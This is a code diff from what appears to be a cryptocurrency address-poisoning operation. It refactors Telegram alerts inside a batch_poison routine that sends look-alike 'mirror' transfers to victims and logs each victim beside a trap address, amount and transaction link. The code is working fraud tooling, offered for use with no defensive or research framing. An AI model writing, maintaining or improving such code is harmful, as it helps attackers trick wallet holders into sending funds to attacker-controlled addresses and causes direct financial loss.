@@ -1163,6 +1163,47 @@ def update_transfer_cache(trap_id, block_num, asset, amount):
         logger.warning(f"[Cache] Failed to update cache for trap {trap_id}: {e}")
 
 
+def send_batch_telegram_notifications(queue, tx_hash, campaign_id, is_final=False):
+    """
+    Splits a batch of transactions into multiple Telegram messages 
+    to respect Telegram's 4096 character limit per message.
+    """
+    tx_url = get_explorer_url(tx_hash, 'tx')
+    
+    # Split queue into chunks of 20 to stay safely under the 4096 char limit
+    CHUNK_SIZE = 20
+    chunks = [queue[i:i + CHUNK_SIZE] for i in range(0, len(queue), CHUNK_SIZE)]
+    
+    title = "🪞 *Final Batch Mirror Events!*" if is_final else "🪞 *Batch Mirror Events Emitted!*"
+    
+    for chunk_idx, chunk in enumerate(chunks):
+        # Add part number if there are multiple messages
+        if len(chunks) > 1:
+            header = f"{title} (Part {chunk_idx + 1}/{len(chunks)})\n\n"
+        else:
+            header = f"{title}\n\n"
+            
+        header += f"👥 Processed: {len(queue)} victims\n"
+        header += f"🔗 [View TX on Explorer]({tx_url})\n\n"
+        
+        msg = header
+        
+        # Calculate the starting index for continuous numbering across messages
+        start_idx = chunk_idx * CHUNK_SIZE + 1
+        
+        for idx, q in enumerate(chunk, start_idx):
+            decimals = get_token_decimals(q['asset'])
+            amount_display = q['amount'] / (10 ** decimals)
+            victim_url = get_explorer_url(q['victim'])
+            trap_url = get_explorer_url(q['trap'])
+            
+            msg += f"*{idx}.* ({amount_display:.4f} {q['asset']})\n"
+            msg += f"👤 [Victim]({victim_url})\n"
+            msg += f"🪤 [Trap]({trap_url})\n\n"
+            
+        send_telegram(msg, campaign_id=campaign_id)
+
+
 def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
     has_trap_ids = trap_ids is not None and len(trap_ids) > 0
     entry_has_id = False  # Track if entries include trap ID (filtered mode)
@@ -1330,23 +1371,8 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
                     if tid:
                         update_trap_dust_count(tid)
                 
-                               # Send single Telegram notification for the batch
-                tx_url = get_explorer_url(tx_hash, 'tx')
-                batch_msg = (
-                    f"🪞 *Batch Mirror Events Emitted!*\n\n"
-                    f"👥 Processed: {len(queue)} victims\n"
-                    f"🔗 [View TX on Explorer]({tx_url})\n\n"
-                )
-                for idx, q in enumerate(queue, 1):
-                    decimals = get_token_decimals(q['asset'])
-                    amount_display = q['amount'] / (10 ** decimals)
-                    victim_url = get_explorer_url(q['victim'])
-                    trap_url = get_explorer_url(q['trap'])
-                    batch_msg += f"*{idx}.* ({amount_display:.4f} {q['asset']})\n"
-                    batch_msg += f"👤 [Victim]({victim_url})\n"
-                    batch_msg += f"🪤 [Trap]({trap_url})\n\n"
-                
-                send_telegram(batch_msg, campaign_id=campaign_id)
+                                # 🚀 Send chunked Telegram notifications (respects 4096 char limit)
+                send_batch_telegram_notifications(queue, tx_hash, campaign_id, is_final=False)
             else:
                 # Batch failed - check if gas issue
                 operator_key = get_mirror_operator_key(campaign_id)
@@ -1402,22 +1428,8 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
                 if tid:
                     update_trap_dust_count(tid)
             
-            tx_url = get_explorer_url(tx_hash, 'tx')
-            batch_msg = (
-                f"🪞 *Final Batch Mirror Events!*\n\n"
-                f"👥 Processed: {len(queue)} victims\n"
-                f"🔗 [View TX on Explorer]({tx_url})\n\n"
-            )
-            for idx, q in enumerate(queue, 1):
-                decimals = get_token_decimals(q['asset'])
-                amount_display = q['amount'] / (10 ** decimals)
-                victim_url = get_explorer_url(q['victim'])
-                trap_url = get_explorer_url(q['trap'])
-                batch_msg += f"*{idx}.* ({amount_display:.4f} {q['asset']})\n"
-                batch_msg += f"👤 [Victim]({victim_url})\n"
-                batch_msg += f"🪤 [Trap]({trap_url})\n\n"
-            
-            send_telegram(batch_msg, campaign_id=campaign_id)
+                        # 🚀 Send chunked Telegram notifications for final batch
+            send_batch_telegram_notifications(queue, tx_hash, campaign_id, is_final=True)
         else:
             logger.error(f"[batch] ❌ Final batch failed")
 
